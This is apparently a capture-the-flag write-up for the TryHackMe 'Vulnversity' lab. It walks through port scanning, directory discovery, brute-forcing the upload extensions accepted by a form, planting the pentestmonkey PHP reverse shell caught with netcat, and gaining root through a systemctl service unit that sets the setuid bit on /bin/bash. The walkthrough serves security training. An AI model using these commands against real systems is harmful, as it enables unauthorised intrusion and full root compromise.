# Vulnversity - solution
- Link: https://tryhackme.com/room/vulnversity
- Difficulty: `easy`

## Host recognition
- `cd nmap`
-  `nmap --open <IP> -oG scan`
 -  `extractPorts scan` (custom command) to copy open ports
- `nmap -sCV -p21,22,139,445,3128,3333 <IP> -oN ports`

## Port 3333 (Apache http) - website recognition
- `gobuster dir -u http://<IP>:3333 -w /usr/share/wordlists/dirb/common.txt -o hidden_dir` to discover hidden directories
- Found `/internal`
- Found an input form on `http://<IP>:3333/internal`
- Tried to brute force that form with any possible file extension
- On browser:
  - Added FoxyProxy extension (`127.0.0.1:8080` as proxy)
- On Burpsuite:
  - `Proxy` -> `Intercept on`
- On browser:
  - Started FoxyProxy 
  - Uploaded a random file on the `http://<IP>:3333/internal` input form
- On Burpsuite:
  - Sent to Intruder the error message 
  - On `Intruder` window:
    - Removed all the `$` characters and added them only between `.png` (uploaded a .png file in my case)
  - On `Payload` window:
    - `Load` -> `/usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt`
    - Unchecked `URL-encode these characters` option
    - Started the attack
    - Found `.phtml` as extension with a different response lenght, so I could exploit this vulnerability uploading a `.phtml` file 

## Exploitation
- `cd scripts`
- Downloaded `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` 
- Set my own IP and a random port in that code
- Uploaded the file
- `nc -lvnp <port>` to make NetCat listen on the specified port
- Visited `http://<IP>:3333/internal/upload` and run the uploaded file (this hidden subdirectory should appear if we run `gobuster dir -u http://<IP>:3333/internal -w /usr/share/wordlists/dirb/common.txt -o hidden_dir`)
- Inside the reverse shell:
  - `cd /home/bill`
  - `cat user.txt`
    - Found the `USER FLAG`
  
## Privileges escalation
- Inside the reverse shell:
  - Couldn't access `/root`, so:
  - `find / -perm -4000 2>/dev/null` to find binaries 
  - `sudo -l` to discover which binary the active user may run as superuser
  - Found `systemctl`
- Checked it on https://gtfobins.github.io and found how to exploit the binary
- On another window, modified:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
to
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
- Inside the reverse shell:
  - Pasted that modified code
  - `whoami` to check if I were the root user
  - `cd /root`
  - `cat root.txt`
    - Found the `ROOT FLAG`
